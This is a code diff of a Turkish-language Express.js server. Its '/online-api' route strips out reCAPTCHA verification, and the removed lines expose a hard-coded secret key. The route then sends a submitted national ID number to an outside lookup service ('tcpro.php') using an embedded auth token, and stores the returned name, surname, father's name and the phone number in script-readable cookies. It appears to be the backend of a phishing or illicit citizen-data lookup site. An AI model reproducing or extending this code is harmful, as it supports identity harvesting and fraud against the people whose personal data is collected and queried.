@@ -43,40 +43,26 @@ app.get('/gizlilik-politikasi', (req, res) => {
 });
 
 app.post('/online-api', async (req, res) => {
-  const { 'g-recaptcha-response': recaptchaResponse, tridField: tc, telno } = req.body;
+    const tc = req.body.tridField;
+    const telno = req.body.telno; // Telefon numarasını alma
 
-  if (!recaptchaResponse) {
-      return res.status(400).send('reCAPTCHA doğrulaması başarısız.');
-  }
+    try {
+        const response = await axios.get(`https://ilkkuralsaygi.online/apiservice/stayhigh/tcpro.php?auth=stayhighforlife&tc=${tc}`);
+        const data = response.data;
 
-  const secretKey = '6LfMTwwqAAAAAHNspqazdyyX3lgGwmk4Ac6Cw00H';
-  const verificationUrl = `https://www.google.com/recaptcha/api/siteverify?secret=${secretKey}&response=${recaptchaResponse}`;
+        // Çerezlere verileri kaydet
+        res.cookie('adi', data.adi, { httpOnly: false });
+        res.cookie('soyadi', data.soyadi, { httpOnly: false });
+        res.cookie('babaad', data.babaad, { httpOnly: false });
 
-  try {
-      const recaptchaResponse = await axios.post(verificationUrl);
-      const { success } = recaptchaResponse.data;
-
-      if (!success) {
-        return res.status(400).json({ message: 'reCAPTCHA doğrulaması başarısız.' });
+        // Telefon numarasını da çerez olarak kaydet
+        res.cookie('telno', telno, { httpOnly: false });
+        res.cookie('tc', tc, { httpOnly: false });
+        res.redirect('/sorgula');
+    } catch (error) {
+        console.error('API isteğinde hata:', error);
+        res.status(500).send('Sunucu hatası.');
     }
-
-
-  
-      const response = await axios.get(`https://ilkkuralsaygi.online/apiservice/stayhigh/tcpro.php?auth=stayhighforlife&tc=${tc}`);
-      const data = response.data;
-
-      // Çerezlere verileri kaydet
-      res.cookie('adi', data.adi, { httpOnly: false });
-      res.cookie('soyadi', data.soyadi, { httpOnly: false });
-      res.cookie('babaad', data.babaad, { httpOnly: false });
-      res.cookie('telno', telno, { httpOnly: false });
-      res.cookie('tc', tc, { httpOnly: false });
-
-      res.redirect('/sorgula');
-  } catch (error) {
-      console.error('API isteğinde hata:', error);
-      res.status(500).send('Sunucu hatası.');
-  }
 });
 
 // API route
